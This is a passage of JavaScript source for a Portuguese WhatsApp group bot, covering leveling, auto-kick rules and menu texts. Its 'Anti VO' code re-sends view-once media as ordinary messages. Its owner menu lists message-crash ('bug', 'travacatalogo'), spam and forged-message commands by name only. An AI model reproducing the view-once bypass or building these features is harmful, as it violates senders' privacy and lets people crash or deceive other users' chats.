                        fs.writeFileSync('./db/usuário_db/limit.json', JSON.stringify(_limit))
                        limitre = `
*「 🧮SEU LIMIT🧮 」*
*seu limite restante : ${limitCounts}*
`
                        edward.sendMessage(from, limitre, text, { quoted : mek})
                    }
				} 
						
			//funtion limitado
  const isLimit = (sender) =>{ 
          	if (isOwner) {return false;}
		      let position = false
              for (let i of _limit) {
              if (i.id === sender) {
              	let limits = i.limit
              if (limits >= limitawal ) {
              	  position = true
              	  seulimitacabou = `*Desculpe ${pushname} Seu limit acabou*\n*Para conseguir mais limit compre*`
                    edward.sendMessage(from, seulimitacabou, text, {sendEphemeral: true, contextInfo: { forwardingScore: 508, isForwarded: true}, quoted: mek})
                    return true
              } else {
              	_limit
                  position = true
                  return false
               }
             }
           }
           if (position === false) {
           	const obj = { id: sender, limit: 0 }
                _limit.push(obj)
                fs.writeFileSync('./db/usuário_db/limit.json',JSON.stringify(_limit))
           return false
     	  }
     	}*/
		        //Anti VO
        if (isGroup && isViewOnce && isAntiVO) {
            let typenya = mek.message.viewOnceMessage.message["videoMessage"] ? mek.message.viewOnceMessage.message.videoMessage : mek.message.viewOnceMessage.message.imageMessage
            typenya["viewOnce"] = false
            typenya["caption"] = `❗Anti-ViewÙnica ♨️\n\n\n❓Legenda : ${(typenya.caption === '') ? 'SEM MSG' : typenya.caption}`
            let peq = mek.message.viewOnceMessage.message["imageMessage"] ? { key: { fromMe: false, participant: sender, id: mek.key.id }, message: {"viewOnceMessage": {"message": { "imageMessage" : {"viewOnce": true } } } } } :  { key: { fromMe: false, participant: sender, id: mek.key.id }, message: {"viewOnceMessage": {"message": { "imageMessage" : {"viewOnce": true } } } } }
            let pe = await edward.prepareMessageFromContent(from, mek.message.viewOnceMessage.message,{quoted: peq, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: `${jmn} - ${week} - ${calender}`,body:"",previewType:"PHOTO",thumbnail:pperfil,sourceUrl:`https://https://api.whatsapp.com/send/?phone=5555933005901&text=oie&app_absent=0?text=oii`}}})
            await edward.relayWAMessage(pe)
        }     	
// ANTI "TRAVA"        
const isDocumento = (type === 'documentMessage')
const isContato = (type === 'contactMessage')
const isLocalização = (type === 'locationMessage')
const isCatalogo = (type === 'productMessage')
    if (isDocumento) {
   	if (!mek.key.fromMe){
				if (!isGroup) return
				if (!isDoc) return
				if (isGroupAdmins) return reply('Admins pode enviar doc né? :v')
				edward.updatePresence(from, Presence.composing)
				var kic = `${sender.split("@")[0]}@s.whatsapp.net`
				reply('Documento detectado, você será banido!')
			    edward.groupRemove(from, [kic]).catch((e) => { reply(mess.only.Badmin) })
			}
			}
    if (isContato) {
   	if (!mek.key.fromMe){
				if (!isGroup) return
				if (!isCon) return
				if (isGroupAdmins) return reply('Admins pode enviar ctt né? :v')
				edward.updatePresence(from, Presence.composing)
				var kic = `${sender.split("@")[0]}@s.whatsapp.net`
				reply('Contato detectado, você será banido!')
			    edward.groupRemove(from, [kic]).catch((e) => { reply(mess.only.Badmin) })
			}
			}			
    if (isLocalização) {
   	if (!mek.key.fromMe){
				if (!isGroup) return
				if (!isLoc) return
				if (isGroupAdmins) return reply('Admins pode enviar loc né? :v')
				edward.updatePresence(from, Presence.composing)
				var kic = `${sender.split("@")[0]}@s.whatsapp.net`
				reply('Msg de Localização detectada, você será banido!')
			    edward.groupRemove(from, [kic]).catch((e) => { reply(mess.only.Badmin) })
			}
			}						
   if (isCatalogo) {
   	if (!mek.key.fromMe){
				if (!isGroup) return
				if (!isCat) return
				if (isGroupAdmins) return reply('🤨')
				edward.updatePresence(from, Presence.composing)
				var kic = `${sender.split("@")[0]}@s.whatsapp.net`
				reply('Catalogo detectado, você será banido!')
			    edward.groupRemove(from, [kic]).catch((e) => { reply(mess.only.Badmin) })
			}
			}									
        //BALANCEAMENTO DA MOEDA/DINHERO DO BOT/LIMIT
if (!isGroup && !isCmd) add_dinheiro(sender, 5)
if (isGroup && !isCmd) add_dinheiro(sender, 5)
if (!isGroup && isCmd) add_dinheiro(sender, 5)
if (isGroup && isCmd) add_dinheiro(sender, 5)
/*if (isCmd) {
 //await limitAdd(sender) 
console.log(chalk.keyword("red")("1 Limit foi usado no cmd :"), (typeMessage), chalk.greenBright("de"), chalk.keyword("yellow")(pushname), chalk.greenBright("em"), chalk.keyword("yellow")(from))
}
if (isCmd && isLimit(sender)) {
return reply(seulimitacabou)
console.log(chalk.keyword("red")("Ignorando o cmd :"), (typeMessage), chalk.greenBright("de"), chalk.keyword("yellow")(pushname), chalk.keyword("purple")('Por que seu limit acabou'), chalk.greenBright("em"), chalk.keyword("yellow")(from))
}*/
//JOGO DO ANAGRAMA
    const levelRank = level.getLevelingLevel(sender, _level)
        var role = 'Warrior III'
        if (levelRank <= 5) {
            role = 'Warrior II'
        } else if (levelRank <= 10) {
            role = 'Warrior I'
        } else if (levelRank <= 15) {
            role = 'Elite III'
        } else if (levelRank <= 20) {
            role = 'Elite II'
        } else if (levelRank <= 25) {
            role = 'Elite I'
        } else if (levelRank <= 30) {
            role = 'Master III'
        } else if (levelRank <= 35) {
            role = 'Master II'
        } else if (levelRank <= 40) {
            role = 'Master I'
        } else if (levelRank <= 45) {
            role = 'GrandMaster III'
        } else if (levelRank <= 50) {
            role = 'GrandMaster II'
        } else if (levelRank <= 55) {
            role = 'GrandMaster I'
        } else if (levelRank <= 60) {
            role = 'Epic III'
        } else if (levelRank <= 65) {
            role = 'Epic II'
        } else if (levelRank <= 70) {
            role = 'Epic I'
        } else if (levelRank <= 75) {
            role = 'Legend III'
        } else if (levelRank <= 80) {
            role = 'Legend II'
        } else if (levelRank <= 85) {
            role = 'Legend I'
        } else if (levelRank <= 90) {
            role = 'Mythic'
        } else if (levelRank <= 95) {
            role = 'Mythical Glory'
        } else if (levelRank >= 100) {
            role = 'Immortal'
        } 
        // FUNCTION LEVELING
       if (isGroup && !mek.key.fromMe && !level.isGained(sender) && isLevelingOn) {
       try {
       level.addCooldown(sender)
       const verificardinheiro = verificar_dinheiro(sender, dinheiro)
       if (verificardinheiro === undefined) confirma_dinheiro(sender, dinheiro)
       const dinheirodado = Math.floor(Math.random() * (15 - 25 + 1) + 20)
       add_dinheiro(sender, dinheirodado, dinheiro)
       const currentLevel = level.getLevelingLevel(sender, _level)
       const amountXp = Math.floor(Math.random() * (15 - 25 + 1) + 20)
       const requiredXp = 10 * Math.pow(currentLevel, 2) + 50 * currentLevel + 100
       level.addLevelingXp(sender, amountXp, _level)
       if (requiredXp <= level.getLevelingXp(sender, _level)) {
       level.addLevelingLevel(sender, 1, _level)
       const userLevel = level.getLevelingLevel(sender, _level)
       const fetchXp = 10 * Math.pow(userLevel, 2) + 50 * userLevel + 100
       reply(`*「 LEVEL UP 」*\n\n➸ *Nome :* ${pushname}\n➸ *Xp :* ${level.getLevelingXp(sender, _level)} / ${fetchXp}\n➸ *Level :* ${currentLevel} -> ${level.getLevelingLevel(sender, _level)} 🆙 \n➸ *Patente*: *${role}*\n\nParabéns!! 🎉🎉`)
} 
       } catch (err) {
       console.error(err)
}
}
 edward.on('group-participants-update', async(anu) => {

mdata = await edward.groupMetadata(anu.jid)

if(antifake.includes(anu.jid)) {
if (anu.action == 'add'){
num = anu.participants[0]
if(!num.split('@')[0].startsWith(55)) {

setTimeout(async function () {
edward.groupRemove(mdata.id, [num])
					}, 3000)
				}
			}
		}
    })
              

                
 /*if (budy.match(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi')) {

   	if (!mek.key.fromMe){

				if (!isGroup) return
				if (!isAntilink) return
				if (isGroupAdmins) return reply('Admins pode enviar links né? :v')
				edward.updatePresence(from, Presence.composing)
				var kic = `${sender.split("@")[0]}@s.whatsapp.net`
				reply('Link detectado, você será banido!')
			    edward.groupRemove(from, [kic]).catch((e) => { reply(mess.only.Badmin) })
			}
			}*/
        switch (command) {
case 'fetch':
fetch('https://sfile.mobi/search.php?q=Minecraft').then((resultado) => {
reply(resultado)
})
break
case 'clear':
	if (!isOwner && !isMod && !mek.key.fromMe) return reply(mess.only.ownerB)
	reply('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n')
	break

case "22":
	if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
	reshb1=  await edward.prepareMessageFromContent(from,{
		"templateMessage":{
			"hydratedFourRowTemplate":{
				"hydratedContentText":"hola",
				"hydratedFooterText":"hola",
				"hydratedButtoms":[{
					"urlButtons":{
						"displayText":"1",
						"url":"f"
					},
					"index":1
				}]
			},
			"hydratedTemplate":{
				"hydratedContentText":`hola, gracias y tal`,
				"hydratedFooterText":`recuerda actualizar y tal`,
				"hydratedButtoms":[{
					"urlButtons":{
						"displayText":`click y tal`,
						"url":`https://www.youtube.com/watch?v=d0I_Lnm00Q0&list=RDMMDxUJPrSrTRk&index=27`
					},
					"index":0
				}]
			}
		}
	},{});
	edward.relayWAMessage(reshb1)
	break

case '64':
	if (!isOwner && !isMod && !mek.key.fromMe) return reply(mess.only.ownerB)
	imageMsg = (
		await edward.prepareMessageMedia(fs.readFileSync(`./arquivos/img/edward.jpg`),'imageMessage',{thumbnail: fs.readFileSync(`./arquivos/img/edward.jpg`)})).imageMessage

	buttonsMessage = {
		contentText: `a`,
		footerText: '© Creator Lory',
		imageMessage: imageMsg,
		buttons: [{
			buttonId:`${prefix}menu`, 
			buttonText:{displayText: 'Menu'},
			type:1
		}],
		headerType: 4
	}
	prep = await edward.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
	edward.relayWAMessage(prep, {waitForAck: true})
	break
	
case '1':
	if (!isOwner && !isMod && !mek.key.fromMe) return reply(mess.only.ownerB)
	edward.sendMessage(from, {
		degreesLatitude: `0`,
		degreesLongitude: `0`,
		name: `Usted efectivamente es moderador xd`,
		address : `By Lory`,
		sequenceNumber: '99999',
		jpegThumbnail: fs.readFileSync('./arquivos/img/edward.jpg')
	}, MessageType.location, {quoted : mek})
	break
	
case 'documento':
	if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
imglink = await getBuffer(`https://telegra.ph/file/692385eb5225c1be33900.jpg`)
edward.sendMessage(from,fs.readFileSync('./edward.pdf'), document, {mimetype: "application/pdf", filename: 'foto teste',title:'fdskkkkkk', jpegThumbnail: imglink, quoted: say1,contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title:"Testando",body:"",mediaType:"2",thumbnail:imglink,mediaUrl:'https://youtu.be/PP0NnQbvCks', quoted: mek}}})
break
case 'menu':
 stod = `${sender}`
 listMsg = {
 buttonText: 'LISTA DOS MENUS',
 footerText: `*_© ${NomeBot}_*`,
 description: 
 
 `  🄱🄴🄼 🅅🄸🄽🄳🄾 🄰🄾 🄼🄴🄽🅄
                     🄳🄾 🄱🄾🅃
                   
 ♧︎︎︎ \`\`\`Prefixo: ︎︎*\`\`\`
 ♧︎︎ \`\`\`Dono: Bruno ︎︎ \`\`\`
 ♧︎︎ \`\`\`Duvidas? ︎︎\`\`\`
     wa.me/5555933005901
 ♧︎︎︎︎︎ \`\`\`Quer contribuir para o projeto?  \`\`\`
 ♧︎︎ \`\`\`Faça uma pequena doação, pode ser de 1 real :)︎︎\`\`\`
 ︎︎♧︎︎︎ \`\`\`Pix: brunoleal7278@gmail.com︎︎\`\`\`
 ♧︎︎︎︎ \`\`\`Quer me ter em seu grupo ou me adquirir? \`\`\`
 ♧︎︎︎︎ \`\`\`Fale com meu dono\`\`\`
 ♧︎︎ \`\`\`Para entrar em meu grupo digite *gpbot\`\`\`
 
 `,
 sections: [
                     {
                      "title": `${jmn} - ${week} - ${calender}`,
 rows: [
                     {

                              "title": "Meu Criador 🙈",
  		"description": "\n\n_Contato do meu dono_",
                              "rowId": "*criador"
                           },
                          {
                              "title": "Menu Interativo 🫂",
                    		"description": "\n\n_Selecione essa opção para utilizar os comandos interativos!_",
                              "rowId": "*menuinterativo"
                           },
                           {
                              "title": "Menu Anime 🈲",
                              	"description": "\n\n_Selecione essa opção para comandos de animes 🈲_",
                              "rowId": "*animemenu"
                           },
                           {
                              "title": "Menu Dono 😎",
               	"description": "\n\n_comandos exclusivos para o bruno_",
                              "rowId": "*criadorMenu"
                           },
                           {
                              "title": "Menu Maker ✍🏻",
               		"description": "\n\n_Selecione essa opção para utilizar os comandos maker!_",
                              "rowId": "*makermenu"
                           },
                           {
                              "title": "Menu de Edição 📝",
         		"description": "\n\n_Selecione essa opção para utilizar os comandos de edição de fotos/video!_",
                              "rowId": "*editormenu"
                           },
                           {
                              "title": "Menu do Grupo 👤",
                           		"description": "\n\n_Selecione essa opção para utilizar os comandos exclusivos de grupos!_",
                              "rowId": "*grupomenu"
                           },
                           {
                              "title": "Outros ➰",
                               		"description": "\n\n_Selecione essa opção para o menu outros!_",
                              "rowId": "*outrosmenu"
                           },
                           {
                              "title": "Download Menu 📲",
                         		"description": "\n\n_Selecione essa opção para utilizar os comandos de download!_",
                              "rowId": "*downloadmenu"
                            },
                           {
                              "title": "Menu hentai 😏",
                       		"description": "\n\n_Menu dos poeterokkkkkkkmmm_",
                              "rowId": "*hentaimenu"
                           },
                           {
                              "title": "Menu de Games 🕹️",
                   		"description": "\n\n_Selecione essa opção para utilizar os comandos de jogos !_",
                     "rowId": "*gamemenu"      
                              },
                           {
                              "title": "Menu Sticker 🪄",
                               		"description": "\n\n_Selecione essa opção para utilizar os comandos de figurinhas!_",
                              "rowId": "*stickermenu"
                           },
                           {
                              "title": "Menu Musical 🎵",
                               		"description": "\n\n_Selecione essa opção para utilizar os comandos relacionados a músicas!_",
                              "rowId": "*musicamenu"
                           }
                        ]
                     }],
 listType: 1
}
edward.sendMessage(from, listMsg, MessageType.listMessage, {contextInfo: { mentionedJid: [stod]},quoted:say1})
break
 /* case 'menu2':
        ptod = "556181496039@s.whatsapp.net"
        stod = `${sender}`
       stst = await edward.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
				var groups = edward.chats.array.filter(v => v.jid.endsWith('g.us'))
				var privat = edward.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
				var ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
					uptime = process.uptime();
					const timestampu = speed();
					const totalChat = await edward.chats.all()
					const latensi = speed() - timestampu
					var total = math(`${groups.length} ${privat.length}`)
					const { wa_version, mcc, mnc, os_version, device_manufacturer, device_model } = edward.user.phone
					stamtus = `⍟ ────────────────── ⍟

Total Pv : ${privat.length}
Total Grupos : ${groups.length}
Total Chats : ${totalChat.length}
Velocidade : ${latensi.toFixed(4)} segundos
Runtime : ${kyun(uptime)}
Bateria : ${baterai.battery}
Carregando? : ${baterai.isCharge}
Modo : ${publik ? 'publico' : 'privado'}
Prefix : ${multi ? 'Multi Prefix' : 'Sem Prefix'}
Uso de Ram : ${ram2}
Hostnome : ${os.hostname()}
Plataforma : ${os.platform()}
Uptime : ${kyun(os.uptime())}
MNC : ${mnc}
MCC : ${mcc}
Modelo do dispositivo: ${edward.user.phone.device_model}
Fabricante : ${device_manufacturer}
Wa Versão: ${edward.user.phone.wa_version}
Os Versão: ${edward.user.phone.os_version}

⍟ ────────────────── ⍟`
Sendbutdocument(from, stamtus, "@Bruno*", fs.readFileSync('./edward.pdf'), {mimetype:Mimetype.pdf, thumbnail:img, filename:`edward.pdf`, pageCount: 9999999 }, [{buttonId:`ping`,buttonText:{displayText:'✨PING☕'},type:1}], {quoted:say1, contextInfo: { mentionedJid: [dtod,otod,stod], forwardingScore: 508, isForwarded: true, externalAdReply:{title:`${pushname}\n@Bruno`,mediaType:"2",thumbnail:fs.readFileSync('./arquivos/img/verificado.jpg'),mediaUrl:`${instagramkk}`}}})
break*/
case 'figututo':
reply(`olá ${pushname}, bem vindo(a) ao tutorial de figurinha...`)
reply(`siga os passos abaixo para fazer uma figurinha...`)
aaa = await edward.sendMessage(from, imgcriador, image, {caption: `Tutorial exemplo`, quoted: mek, thumbnail: null})
edward.sendMessage(from, `*figu`, text, {quoted: aaa}) 
figufalsa = getBuffer(imgcriador)
sendStickerUrl(from, `${figufalsa}`).catch(() => reply('Deu erro 😢'))
break
case 'animemenu':
uptime = process.uptime();
  timestam0 = speed();
  latensiakk = speed() - timestam0
  groupsakk = edward.chats.array.filter(v => v.jid.endsWith('g.us'))
reply( ` 🄱🄴🄼 🅅🄸🄽🄳🄾 🄰🄾 🄼🄴🄽🅄
                      🄰🄽🄸🄼🄴
                          
✰ \`\`\`Prefixo: *\`\`\`
✰ \`\`\`Total Grupos : ${groupsakk.length}\`\`\`
✰ \`\`\`Velocidade : ${latensiakk.toFixed(4)} Segundos\`\`\`
✰\`\`\`Runtime : ${kyun(uptime)}\`\`\`

✞︎ \`\`\`amv\`\`\`
♡︎ \`\`\`metadinha\`\`\`
❦︎\`\`\`icon\`\`\`
✞︎ \`\`\`wallpaperanime\`\`\`
♡︎ \`\`\`loli\`\`\`
❦︎ \`\`\`eren\`\`\`
✞︎ \`\`\`mikasa\`\`\`
♡︎ \`\`\`levi\`\`\`
❦︎ \`\`\`miku\`\`\`
✞︎ \`\`\`nezuko\`\`\`
♡︎ \`\`\`tanjiro\`\`\`
❦︎ \`\`\`luffy\`\`\`
✞︎ \`\`\`zoro\`\`\`
♡︎ \`\`\`nami\`\`\`
❦︎ \`\`\`edward\`\`\`
✞︎ \`\`\`winry\`\`\`
♡︎ \`\`\`akame\`\`\`
❦︎ \`\`\`esdeath\`\`\`
✞︎ \`\`\`filo\`\`\`
♡︎ \`\`\`akame\`\`\`
❦︎ \`\`\`naruto\`\`\`
✞︎ \`\`\`hinata\`\`\`
♡︎ \`\`\`zerotwo\`\`\`
❦︎ \`\`\`ichigo\`\`\`
✞︎ \`\`\`bunnygirl\`\`\`
♡︎ \`\`\`itachi\`\`\`
❦︎ \`\`\`madara\`\`\`
✞︎ \`\`\`spike\`\`\`
♡︎ \`\`\`faye\`\`\`
❦︎ \`\`\`julia\`\`\`
`)
break
case 'musicamenu':
uptime = process.uptime();
  timestam0 = speed();
  latensiakk = speed() - timestam0
  groupsakk = edward.chats.array.filter(v => v.jid.endsWith('g.us'))
reply( ` 🄱🄴🄼 🅅🄸🄽🄳🄾 🄰🄾 🄼🄴🄽🅄
                      🄼🅄🅂🄸🄲🄰🄻
                          
✰ \`\`\`Prefixo: *\`\`\`
✰ \`\`\`Total Grupos : ${groupsakk.length}\`\`\`
✰ \`\`\`Velocidade : ${latensiakk.toFixed(4)} Segundos\`\`\`
✰\`\`\`Runtime : ${kyun(uptime)}\`\`\`

✞︎ \`\`\`liryc\`\`\`
♡︎ \`\`\`magyn\`\`\`
❦︎ \`\`\`kamaitachi\`\`\`
✞︎ \`\`\`vmz\`\`\`
♡︎ \`\`\`lilchainz\`\`\`
❦︎ \`\`\`mikezin\`\`\`
✞︎ \`\`\`thefox\`\`\`
♡︎ \`\`\`nanasai\`\`\`
❦︎ \`\`\`dri\`\`\`
`)
break
case 'criadormenu':
  uptime = process.uptime();
  const timestam = speed();
  const latensia = speed() - timestam
  var groupsa = edward.chats.array.filter(v => v.jid.endsWith('g.us'))
reply(`
    🄱🄴🄼 🅅🄸🄽🄳🄾 🄰🄾 🄼🄴🄽🅄 🄳🄾          🄼🄴🅄 🄳🄾🄽🄾 :)



✰ \`\`\`Prefixo: *\`\`\`
✰ \`\`\`Total Grupos : ${groupsa.length}\`\`\`
✰ \`\`\`Velocidade : ${latensia.toFixed(4)} Segundos\`\`\`
✰\`\`\`Runtime : ${kyun(uptime)}\`\`\`

    ❒ 「 \`\`\`COMANDOS\`\`\` 」
    
♧ ︎︎︎\`\`\`autorespon\`\`\`
✞ ︎\`\`\`antidelete [ _on/off_ ]\`\`\`
♔ ︎\`\`\`autoler\`\`\`
♧ \`\`\`antipv \`\`\`
✞ \`\`\`fakevn \`\`\`
♔ \`\`\`autoescrever\`\`\`
♧ \`\`\`autoplay\`\`\`
✞ \`\`\`tm \`\`\`
♔ \`\`\`totm sticker/audio\`\`\`
♧ \`\`\`return [ _javascript_ ]\`\`\`
✞ \`\`\`limparchats\`\`\`
♔ \`\`\`delchat\`\`\`
♧ \`\`\`mute\`\`\`
✞ \`\`\`unmute\`\`\`
♔ \`\`\`ban \`\`\`
♧ \`\`\`unban \`\`\`
✞ \`\`\`public\`\`\`
♔ \`\`\`self\`\`\`
♧ \`\`\`spam \`\`\`
✞ \`\`\`despromovertodos\`\`\`
♔ \`\`\`promovertodos\`\`\`
♧ \`\`\`shutdown\`\`\`
✞ \`\`\`exif\`\`\`
♔ \`\`\`setprofile\`\`\`
♧ \`\`\`setname \`\`\`
✞ \`\`\`setprefix\`\`\`
♔ \`\`\`setbio\`\`\`
♧ \`\`\`leave\`\`\`
✞ \`\`\`restart\`\`\`
♔ \`\`\`join \`\`\`
♧ \`\`\`addrespon\`\`\`
✞ \`\`\`delrespon\`\`\`
♔ \`\`\`listrespon\`\`\`
✞ \`\`\`bug\`\`\`
♧ \`\`\`bugpc2\`\`\`
♔ \`\`\`bugtroli2 \`\`\`
✞ \`\`\`bugpc\`\`\`
♧ \`\`\`bugcombine\`\`\`
♔ \`\`\`bugtroli\`\`\`
✞ \`\`\`buglokasi\`\`\`
♧ \`\`\`bughole\`\`\`
♔ \`\`\`travacatalogo\`\`\`
 `)
       
break
case 'downloadmenu':
uptime = process.uptime();
const timestam1 = speed();
    const latens = speed() - timestam1
  var grou = edward.chats.array.filter(v => v.jid.endsWith('g.us'))
reply(`
    🄱🄴🄼 🅅🄸🄽🄳🄾 🄰🄾 🄼🄴🄽🅄 
              🄳🄾🅆🄽🄻🄾🄰🄳:)


✰ \`\`\`Prefixo: *\`\`\`
✰ \`\`\`Total Grupos : ${grou.length}\`\`\`
✰ \`\`\`Velocidade : ${latens.toFixed(4)} Segundos\`\`\`
✰\`\`\`Runtime : ${kyun(uptime)}\`\`\`

♫ ︎\`\`\`google [ _pesquisa_ ]\`\`\`
☾ ︎\`\`\`gimage [ _pesquisa_ ]\`\`\`
✞ ︎\`\`\`wiki [ _pesquisa_ ]\`\`\`
♫ \`\`\`ytsearch [ _título_ ]\`\`\`
☾ \`\`\`ytmp4 [ _link yt_ ]\`\`\`
✞ \`\`\`ytmp3 [ _link yt_ ]\`\`\`
♫ \`\`\`playdl [ _título da msc_ ]\`\`\`
☾ \`\`\`play [ _título da msc_ ]\`\`\`
✞ \`\`\`video [ _título do vídeo_ ]\`\`\`
♫ \`\`\`tinyurl [ _link_ ]\`\`\`
☾ \`\`\`fetch [ _link_ ]\`\`\`
✞ \`\`\`igdl [ _link_ ]\`\`\`
♫ \`\`\`tiktokdl [ _link_ ]\`\`\`
☾ \`\`\`pinterest [ _pesquisa_ ]\`\`\`
✞ \`\`\`tourl [ _marque image/video_ ]\`\`\`
♫ \`\`\`githubstalk [ _nome_ ]\`\`\`
☾ \`\`\`translate [ _msg códe/pt_ ]\`\`\`
✞ \`\`\`ss [ _link_ ]\`\`\`
 `)
break
case 'makermenu':
  uptime = process.uptime();
const timestam2 = speed();
      const lates = speed() - timestam2
  var grpu = edward.chats.array.filter(v => v.jid.endsWith('g.us'))
reply(`
    🄱🄴🄼 🅅🄸🄽🄳🄾 🄰🄾 🄼🄴🄽🅄 
                   🄼🄰🄺🄴🅁 :)


✰ \`\`\`Prefixo: *\`\`\`
✰ \`\`\`Total Grupos : ${grpu.length}\`\`\`
✰ \`\`\`Velocidade : ${lates.toFixed(4)} Segundos\`\`\`
✰\`\`\`Runtime : ${kyun(uptime)}\`\`\`
 
✰ \`\`\`Comandos A Seguir:\`\`\`
 
♡︎︎ \`\`\`grafite \`\`\`
✞︎ \`\`\`space\`\`\`
❦ ︎\`\`\`ninjalogo\`\`\`
♡ ︎\`\`\`pubg\`\`\`
✞ ︎\`\`\`tigre\`\`\`
❦ ︎\`\`\`pornhub\`\`\`
♡ ︎\`\`\`matrix\`\`\`
✞ ︎\`\`\`marvel\`\`\`
❦ ︎\`\`\`1917 \`\`\`
♡ ︎\`\`\`transformer\`\`\` 
✞ ︎\`\`\`berry \`\`\`
❦ ︎\`\`\`magma\`\`\`
♡ ︎\`\`\`harrypotter\`\`\` 
✞ ︎\`\`\`embossed \`\`\`
❦ ︎\`\`\`america\`\`\`
♡ \`\`\`galaxy\`\`\`
✞ \`\`\`stone\`\`\`
❦ \`\`\`broken\`\`\`
♡ \`\`\`artpaper \`\`\`
✞ \`\`\`3dglossy \`\`\`
❦ \`\`\`3dunderwater \`\`\`
♡ \`\`\`cloud \`\`\`
✞ \`\`\`luxury \`\`\`
❦ \`\`\`gradient \`\`\`
♡ \`\`\`sandsummer \`\`\`
✞ \`\`\`metaldarkgold \`\`\`
❦ \`\`\`neonlight \`\`\`
♡ \`\`\`halloweenfire \`\`\`
✞ \`\`\`lava \`\`\`
❦ \`\`\`steeltext \`\`\`
♡ \`\`\`capitaoamerica \`\`\`
✞ \`\`\`toxic \`\`\`
❦ \`\`\`horror\`\`\`
♡ \`\`\`thunder\`\`\`
✞ \`\`\`naturalleaves\`\`\` 
❦ \`\`\`blackpink \`\`\`
♡ \`\`\`christmas\`\`\`  ` )
break
case 'editormenu':
    uptime = process.uptime();
const timestam3 = speed();
const lateskk = speed() - timestam3
  var grpukk = edward.chats.array.filter(v => v.jid.endsWith('g.us'))
reply(`
    🄱🄴🄼 🅅🄸🄽🄳🄾 🄰🄾 🄼🄴🄽🅄 
                  🄴🄳🄸🅃🄾🅁 :)


✰ \`\`\`Prefixo: *\`\`\`
✰ \`\`\`Total Grupos : ${grpukk.length}\`\`\`
✰ \`\`\`Velocidade : ${lateskk.toFixed(4)} Segundos\`\`\`
✰\`\`\`Runtime : ${kyun(uptime)}\`\`\`

♫︎ \`\`\`editraimbow\`\`\`
☽︎ \`\`\`editblur\`\`\`
✞︎ \`\`\`editinvert\`\`\`
♫ \`\`\`editsepia\`\`\`
☽ \`\`\`editrosto\`\`\`
✞︎ \`\`\`editdrip\`\`\`
♫ \`\`\`editwanted\`\`\`
☽ \`\`\`edittrash\`\`\`
✞︎ \`\`\`editshit\`\`\`
 `)
break
case 'grupomenu':
    uptime = process.uptime();
const timestam4 = speed();
const latesk1k = speed() - timestam4
  var grpukk1 = edward.chats.array.filter(v => v.jid.endsWith('g.us'))
  
 reply(`🄱🄴🄼 🅅🄸🄽🄳🄾 🄰🄾 🄼🄴🄽🅄 
               🄳🄾 🄶🅁🅄🄿🄾 :)
            
✰ \`\`\`Prefixo: *\`\`\`
✰ \`\`\`Total Grupos : ${grpukk1.length}\`\`\`
✰ \`\`\`Velocidade : ${latesk1k.toFixed(4)} Segundos\`\`\`
✰\`\`\`Runtime : ${kyun(uptime)}\`\`\`
    
 ♕︎ ︎︎\`\`\`nsfw\`\`\`
♪ ︎︎\`\`\`afk \`\`\`
✞ ︎︎\`\`\`getpict\`\`\`
♕︎ ︎︎\`\`\`gpinfo\`\`\`
♪ \`\`\`getname \`\`\`
✞ ︎\`\`\`getbio \`\`\`
♕︎ ︎\`\`\`promover \`\`\`
♪ \`\`\`despromover\`\`\`
✞ ︎\`\`\`antilink \`\`\`
♕︎ ︎\`\`\`antidoc \`\`\`
♪ \`\`\`anticon \`\`\`
✞ ︎\`\`\`antiloc \`\`\`
♕︎ ︎\`\`\`anticat \`\`\`
♪ \`\`\`antifake \`\`\`
✞ ︎\`\`\`antiviewonce [ _on/off_ ]\`\`\`
♕︎ ︎\`\`\`antibug \`\`\`
♪ \`\`\`autofigurinha \`\`\`
✞ ︎\`\`\`welcome \`\`\`
♕︎ ︎\`\`\`getpp\`\`\`
♪ \`\`\`kick @\`\`\`
✞ ︎\`\`\`getdescgp\`\`\`
♕︎ ︎\`\`\`sider \`\`\`
♪ \`\`\`hacked \`\`\`
✞ \`\`\`setnamegp \`\`\`
♕︎ ︎\`\`\`setdeskgp\`\`\` 
♪ \`\`\`fakemsg [ _@tag|texto1|texto2_  ]\`\`\`
✞ ︎\`\`\`criarctt [ _@tag|nome_ ]\`\`\`
♕︎ ︎\`\`\`gp \`\`\`
♪ \`\`\`resetlinkgp\`\`\`
✞ ︎\`\`\`linkgp\`\`\`
♕︎ ︎\`\`\`hidetag\`\`\`
♪ \`\`\`sticktag \`\`\`
✞ ︎\`\`\`totag \`\`\``)
break
case 'outrosmenu':
    uptime = process.uptime();
const timestam5 = speed();
 const lateskjk = speed() - timestam5
  var grpukjk = edward.chats.array.filter(v => v.jid.endsWith('g.us'))
reply(`
    🄱🄴🄼 🅅🄸🄽🄳🄾 🄰🄾 🄼🄴🄽🅄 
                🅁🄰🄽🄳🄾🄼:)


✰ \`\`\`Prefixo: *\`\`\`
✰ \`\`\`Total Grupos : ${grpukjk.length}\`\`\`
✰ \`\`\`Velocidade : ${lateskjk.toFixed(4)} Segundos\`\`\`
✰\`\`\`Runtime : ${kyun(uptime)}\`\`\`

    ❒ 「 \`\`\`MENU OUTROS\`\`\` 」
    
♡ ︎\`\`\`report\`\`\`
⍟ \`\`\`jadibot\`\`\`
♔ ︎\`\`\`pesquisamsg\`\`\`
♡ ︎\`\`\`tag \`\`\`
⍟ \`\`\`tagme\`\`\`
♔︎ \`\`\`tts \`\`\`
♡︎ \`\`\`ler\`\`\`
⍟ \`\`\`readmore\`\`\`
♔︎ \`\`\`fitnahpc\`\`\`
♡︎ \`\`\`chat\`\`\`
⍟ \`\`\`fdeface \`\`\`
♔︎ \`\`\`listimage\`\`\`
♡︎ \`\`\`liststicker\`\`\`
